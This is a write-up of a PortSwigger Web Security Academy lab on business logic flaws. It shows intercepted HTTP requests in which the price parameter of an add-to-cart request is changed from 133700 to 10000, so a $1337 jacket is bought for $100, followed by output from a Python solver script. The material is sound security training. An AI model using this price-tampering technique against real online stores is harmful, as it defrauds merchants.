# Lab: Excessive trust in client-side controls

### Instructions

This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a "Lightweight l33t leather jacket".

You can log in to your own account using the following credentials: `wiener:peter` 

### Solution

Logging in with the provided credentials, we see the note: `Store credit: $100.00`.

Clicking on the "Lightweight l33t leather jacket" we see the price is $1337.00.

Adding the item to our shopping cart and checking out and capturing this request in Burp we find:

```
POST /cart/checkout HTTP/2
Host: 0a53006503d1ef25807ddac5009a00c8.web-security-academy.net
Cookie: session=HZYZIGwqm7za4mAu4JH5fEWURvMUTb9j
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
<SNIP>
```

Forwarding this returns the error:

```
HTTP/2 303 See Other
Location: /cart?err=INSUFFICIENT_FUNDS
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Going back one step and capturing the request where we add the item to our cart we find:

```
POST /cart HTTP/2
Host: 0a53006503d1ef25807ddac5009a00c8.web-security-academy.net
Cookie: session=HZYZIGwqm7za4mAu4JH5fEWURvMUTb9j
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Origin: https://0a53006503d1ef25807ddac5009a00c8.web-security-academy.net
Referer: https://0a53006503d1ef25807ddac5009a00c8.web-security-academy.net/product?productId=1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=1&redir=PRODUCT&quantity=1&price=133700
```

Let's update the price to $100.00 and send the request:

```
productId=1&redir=PRODUCT&quantity=1&price=10000
```
Back in the browser we find the jacket in our cart with the price of $100.00

```
Total: 	$100.00
```

We can place the order, having bypassed the client-side pricing controls, which solves the lab:

```
Your order is on its way!
Name 	Price 	Quantity 	
Lightweight "l33t" Leather Jacket 	$1337.00 	1 	
Total: 	$100.00
```

### Python Solution

See `logic_vuln_01.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Business_Logic_Vulnerabilities/Logic_Vuln_01_excessive_trust_in_client-side_controls]
└─$ python logic_vuln_01.py https://0aa300f1042121ee809d9a9d0087008c.web-security-academy.net/
[+] Login successful
[*] Adding jacket to cart and reducing price to $100.00...
[*] Checking out...
[+] Checkout successful.. Lab solved
```